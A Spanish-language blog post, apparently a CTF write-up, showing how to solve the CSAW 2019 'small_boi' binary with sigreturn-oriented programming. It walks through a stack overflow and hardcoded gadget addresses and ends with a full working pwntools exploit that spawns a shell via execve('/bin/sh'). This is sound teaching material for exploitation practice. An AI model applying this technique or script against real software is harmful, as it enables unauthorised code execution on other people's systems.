@@ -1,0 +1,191 @@
+---
+layout: post
+title: WRITEUP, small_boi csaw19, aprendiendo SROP
+date: 2020-07-14 00:00
+comments: true
+categories: [Sin categoría]
+---
+<!-- wp:paragraph -->
+<p>Tenía guardado este writeup, para hablar de SROP, pero justo el ctf de <a href="https://www.linkedin.com/showcase/convid/?viewAsMember=true">convid</a>, me pilló con un desafío en el que <a href="/writeup-scandinavian-journal-of-psychology/">ocupe esta técnica</a>, de todas formas y para que no se pierda aca les dejo el writeup. Es un binario del ctf <a href="https://ctftime.org/event/870">CSAW 2019</a> de 100 puntos llamado “small_boi” (pueden descargarlo de <a href="https://github.com/dplastico/small_boi/blob/master/small_boi">aca</a>) el cual resolveremos usando la técnica de sig return oriented programming.&nbsp;<br></p>
+<!-- /wp:paragraph -->
+
+<!-- wp:paragraph -->
+<p>Y Bueno que es <a href="https://en.wikipedia.org/wiki/Sigreturn-oriented_programming">SROP</a>?&nbsp; Es una técnica usa en caso de estar presente a un escenario en el cual tenemos protección NX activada y usamos el syscall sig return para “limpiar” el stack frame (me perdonaran no se me ocurre mejor forma de explicarlo) permitiéndonos asignar a cada registro al valor que deseemos.</p>
+<!-- /wp:paragraph -->
+
+<!-- wp:paragraph -->
+<p></p>
+<!-- /wp:paragraph -->
+
+<!-- wp:image {"id":217} -->
+<figure class="wp-block-image"><img src="/wp-content/uploads/2020/07/image.png" alt="" class="wp-image-217" /></figure>
+<!-- /wp:image -->
+
+<!-- wp:paragraph -->
+<p><br></p>
+<!-- /wp:paragraph -->
+
+<!-- wp:paragraph -->
+<p>Por que existe un syscall así se preguntaran? Pues para que el kernel por ejemplo en momento de ejecución pueda retornar el estado de un programa al retornar de otra syscall por ejemplo. Más detalles pueden encontrar <a href="https://man7.org/linux/man-pages/man2/sigreturn.2.html">aca</a><br></p>
+<!-- /wp:paragraph -->
+
+<!-- wp:paragraph -->
+<p>Bueno con esto en mente pasemos a la accion!<br></p>
+<!-- /wp:paragraph -->
+
+<!-- wp:paragraph -->
+<p>Podemos observar que es un binario de 64 bits staticamente linkeado a libc, y que solo cuenta con la proteccion NX activada.<br></p>
+<!-- /wp:paragraph -->
+
+<!-- wp:image -->
+<figure class="wp-block-image"><img src="https://lh4.googleusercontent.com/PcXEFJ-Hl96nfRubXWkIGaCcVlilAEiTTlc3IptF966sE7J8ncWPcB1S0EUUrkLZmFfSOfy0T7S3JRU1QZNdFbvF6hwbhweq0z8GmcoSsrN7XaVFjgg3AduiJlFt3hjNBh1TFSg-" alt="" /></figure>
+<!-- /wp:image -->
+
+<!-- wp:paragraph -->
+<p>El binario simplemente espera un input y luego parece cerrarse, es un binario pequeno aparentemente programado en ASM o muy poco codigo, revisemos en más detalle en IDA…<br></p>
+<!-- /wp:paragraph -->
+
+<!-- wp:image -->
+<figure class="wp-block-image"><img src="https://lh5.googleusercontent.com/knYNsqmyDfslA2WiFm8mF4vDrw2d2kRa1JSOgEBWs0t7ge4EP4okkeORshOLNErB4fAxX7sg15XX7U29bofqJpzOp7ZvcMKu1ltVdCzfSeel3YlvHzFwgknZGZ8R5etk8M3CC1QQ" alt="" /></figure>
+<!-- /wp:image -->
+
+<!-- wp:paragraph -->
+<p>El entry point nos muestra que llama a una función en 0x40018C la cuyal renombrare a vuln, luego de eso vemos un syscall a 0x3c lo cual nos indica un exit inmediatamente después analicemos la función mencionada.<br></p>
+<!-- /wp:paragraph -->
+
+<!-- wp:image -->
+<figure class="wp-block-image"><img src="https://lh3.googleusercontent.com/Mk8f2D_66EjBGSRlDb4b4YlY60S-OubWZwYAZ27tkGbZKW2LlGp_3ai8w5E85AcIX1lNtdn_oIPAs8RL2h39q2yZodb7-0nyvnwA8oyyXonMMkOHm10HadeSB1Mtm-fmKGvynuKD" alt="" /></figure>
+<!-- /wp:image -->
+
+<!-- wp:paragraph -->
+<p>Aca podemos ver cómo ocurre la vulnerabilidad, setea un buffer de 20 hex, luego realiza un xor sobre los registros rax y rdi para dejarlos en cero. Esto para que rax apunte al syscall 0 (read) y rdi apunte al stdin (0). El problema es nuestro RDX que indica el tamaño del input que leeremos el cual es de 200, mucho más de los 20 hex que tenemos disponibles, lo que causará un buffer overflow.<br></p>
+<!-- /wp:paragraph -->
+
+<!-- wp:paragraph -->
+<p>Explorando el binario vemos otras cosas interesantes como el string /bin/sh dentro del binario (nos servira despues)<br></p>
+<!-- /wp:paragraph -->
+
+<!-- wp:image -->
+<figure class="wp-block-image"><img src="https://lh5.googleusercontent.com/7l142MrvlkF7Z7BSFbVNlC-uoOa7jQIeSumiSaiqAfuDTieHovsgyT1rmrJNUFxIBgOEgbBBraBqqVl5gLOGKWvKXwRtHK4bEisp5IgVTovFcf6WEkKd63ggsGZF9LXX0BQBUc_1" alt="" /></figure>
+<!-- /wp:image -->
+
+<!-- wp:paragraph -->
+<p>Además del call a sigreturn en 0x40017c, el cual nos permitirá hacer esta llamada, la cual bien podría considerarse un “one gadget”<br></p>
+<!-- /wp:paragraph -->
+
+<!-- wp:image -->
+<figure class="wp-block-image"><img src="https://lh3.googleusercontent.com/vP2qAHvIUnf1aDLG8nYNuDVpvwm0lOTFiynjDn2TxB-zPrB5vQWck6mCAZQza9w-sUXqVaHNb5NxertQBgL111U-KENPw7NJkwRC1dNIx_g1a4WUe0Hw1R0TH-yuLLE5-dTzdzVo" alt="" /></figure>
+<!-- /wp:image -->
+
+<!-- wp:paragraph -->
+<p>Con esto en mente, hagamos un script para interactuar con el binario, comenzamos con algun setup inicial:<br></p>
+<!-- /wp:paragraph -->
+
+<!-- wp:image -->
+<figure class="wp-block-image"><img src="https://lh3.googleusercontent.com/4VKXk78s0DFFXjbgT_oTj10Si9X9KpeksDc0q7YfE_Wbg0-9dZu_EmixH2stDZk-OvnMPeqVt9DA4kZCjEOGzn1UJ-mXimczMwMdKt2gQH5fd4A_XwuYV0Y3y4hpX3qKts120dwb" alt="" /></figure>
+<!-- /wp:image -->
+
+<!-- wp:paragraph -->
+<p>Ahora, rápidamente en gdb (lo estoy usando con pwndbg) con cyclic vemos que el offset en el que crashea el programa (40 bytes, 8 + de los 32 a los que se termina el buffer, algo típico de overflow en 64 bits)&nbsp;<br></p>
+<!-- /wp:paragraph -->
+
+<!-- wp:image -->
+<figure class="wp-block-image"><img src="https://lh6.googleusercontent.com/pT743iRyUgAxau-61u6MwiPIx8MS2HErK149M2f6IjwN4mTUCb7WrxtJS-j_xGhNCyxc3uEeXrJ4z1VafNBC5arQI2MrVWMuD5YLc0N_tiINQ1KcHs5Et3_d7hoQGRSO1QghiAyi" alt="" /></figure>
+<!-- /wp:image -->
+
+<!-- wp:paragraph -->
+<p>Pues bien con esto no queda nada más que armar el exploit, sabemos que tenemosla direccion de sigreturn entonces creamops el frame usando la <a href="https://docs.pwntools.com/en/stable/rop/srop.html">magia de pwntools</a> (vaya trabajo de hacer manual si alguien quiere experimentarlo puede ver el stream de este <a href="https://www.youtube.com/watch?v=L259SbpYtXM">master</a>!)</p>
+<!-- /wp:paragraph -->
+
+<!-- wp:image -->
+<figure class="wp-block-image"><img src="https://lh3.googleusercontent.com/0lO3WYfUdW7IdCMTk1kgXI8oqPq2hbz4j9E3FFKAwRuGgGxD1oCh5_M7y1A7mohYSvgcEV4zJQgMtVGEppJIZtFIcE4vhnYdbMCOl9hD_EOh15chHZmQSwWPoFy92CxNBE0bgSrx" alt="" /></figure>
+<!-- /wp:image -->
+
+<!-- wp:paragraph -->
+<p>Ahora que setamos en esos registros? Pues sabemos que tenemos el string de /bin/sh en el binario por lo que podemos setearlo como argumento en RDI y llamar a execve poniendo el registor RAX en x3B, ademas debemos setear RSI y RDX a null y finalizar situando la ejecucion (RIP) en la llamada a un syscall, tenemos todo lo que necesitamos menos el address de un syscall, pero que podemos obtener facilmente mirando IDA (recordemos que el binario no tiene ASLR) o bien usando ropper, la cual obtenemos en la direccion 0x400185<br></p>
+<!-- /wp:paragraph -->
+
+<!-- wp:image -->
+<figure class="wp-block-image"><img src="https://lh3.googleusercontent.com/rwx8e8sqKT16qspueRZ7n1tXqVOohKUGUfYezNKjasDKg_p6MSWC3Pbbi1XmmdiN9YQzQ8Qncj7BXp0q18IRKjsykWfqjw_rnY5HPmZo5b0ytXFbS79JZDQ2T2DaBIxfv0-p1l0e" alt="" /></figure>
+<!-- /wp:image -->
+
+<!-- wp:paragraph -->
+<p>Perfecto ya tenemos todo lo que necesitamos! Probemos… Algo ocurre y obtenemos on EOF&nbsp;<br></p>
+<!-- /wp:paragraph -->
+
+<!-- wp:image -->
+<figure class="wp-block-image"><img src="https://lh4.googleusercontent.com/NwkNv3xHwoXo3ODFDQsJUO-ObRO1gq9TMj539GZKpxbmoeT32GWUnJX_3z5D73xGLvtxR0rRLB_ZAJUL6tci5RfI50zL5lGn__0oe1QrFRz_pvW8xTwp_s0qqUFpGKMlqVribZTt" alt="" /></figure>
+<!-- /wp:image -->
+
+<!-- wp:image -->
+<figure class="wp-block-image"><img src="https://lh3.googleusercontent.com/mIo09j22qcK42RRJWF3AsNr9DERS7y7o2CgboV3lZy_mUf9gmYF16YgOIbTHdUrxK7KBwlSc1fYUSIlHQvcArJJJyi1TYQASbQUch5LdgfSQkemtr7xcxwJrcH7tdiyfJVKsRdss" alt="" /></figure>
+<!-- /wp:image -->
+
+<!-- wp:paragraph -->
+<p>Al observar podemos ver que los valores de los registros no estan bien, y parecen haberse corrido (shifted) por lo que despues de mucho rato note que los registros tiene un “shift” de 8 bytes, dentro del frame podremos moverlo, probemos una vez mas<br></p>
+<!-- /wp:paragraph -->
+
+<!-- wp:image -->
+<figure class="wp-block-image"><img src="https://lh6.googleusercontent.com/RJtvZrky6QKbVDq0gmJm141qprwW_jOIoCOg9runwzmDl6eiujM-XjIiWlOMw9ohx0PcKi1YCg5bXgbSeKBTSA8gAhnMlzosKC79Hj42qnZB_FQqx4qTq4BQtIob2gjsqv-mlnZC" alt="" /></figure>
+<!-- /wp:image -->
+
+<!-- wp:paragraph -->
+<p>Esta vez los registros si se acomodan! perfecto<br></p>
+<!-- /wp:paragraph -->
+
+<!-- wp:image -->
+<figure class="wp-block-image"><img src="https://lh6.googleusercontent.com/hmtlqaCEHLpSUDDtSc29RxvAHS7Xr_zuCGEEpSFLGigyw88kB4RqYR4SZFqUxpxxFtz-L_CKHu07woVKRqRmKPiEROjnNLXv8l6mS39_w6Gw7SL7B5U22eMn2nQR6ZmAC503p3oD" alt="" /></figure>
+<!-- /wp:image -->
+
+<!-- wp:paragraph -->
+<p>Con eso ejecutamos y shell:<br></p>
+<!-- /wp:paragraph -->
+
+<!-- wp:image -->
+<figure class="wp-block-image"><img src="https://lh4.googleusercontent.com/idPIGbwammzaMnXWaX4K1azXpowY7TiSXowmYoFiAZbsEYbkjDKFOPuqS8UyxQaZ2vytgrjSaz_7nKMShhxWoTLckk1v00MhsRQ3VtEwapJI8VzW6C48g9wZD_gDfODxop5LYNra" alt="" /></figure>
+<!-- /wp:image -->
+
+<!-- wp:paragraph -->
+<p>Espero que les haya gustado esta técnica de explotación, en lo particular parece una buena técnica para ctfs, especialmente cuando nos enfrentamos a algunas restricciones dentro de libc para llamar one_gadet.<br></p>
+<!-- /wp:paragraph -->
+
+<!-- wp:paragraph -->
+<p>Aca les dejo el exploit final:</p>
+<!-- /wp:paragraph -->
+
+<!-- wp:code -->
+<pre class="wp-block-code"><code>from pwn import *
+
+# info del binario
+context.binary = './small_boi'
+context.arch = 'amd64'
+context.terminal = ['tmux', 'splitw', '-h']
+#funcion para correr el binario
+def start():
+    if args.GDB:
+        return gdb.debug('./small_boi')
+
+    else:
+        return process('./small_boi')
+
+sigret = p64(0x40017c) #sig return address
+
+frame = SigreturnFrame() #sigreturnframe funcion de pwntools para crear el frame
+frame.rip = 0x400185 #syscall, no empaquetamso ya que el frame poondra el valor directo en el registro
+frame.rax = 0x3b #0x3b es el numero de syscall de execve()
+frame.rdi = 0x4001ca #direccion de /bin/sh no ocupamos empaquetado por los mismo que el rip
+frame.rsi = 0x00 # null 
+frame.rdx = 0x00 # null
+
+
+payload = "A" * 40 #offset
+payload += sigret #direccion de sigretur
+#nuevo frame, con shift de 8 por el cambio del stack
+#vi otros writeups y no se si esto le paso a todo el mundo, a mi me ocurrio con ubuntu 18.04
+payload += str(frame)[8:] 
+
+#interaccion con el binario
+r = start()
+r.sendline(payload)
+r.interactive()</code></pre>
+<!-- /wp:code -->
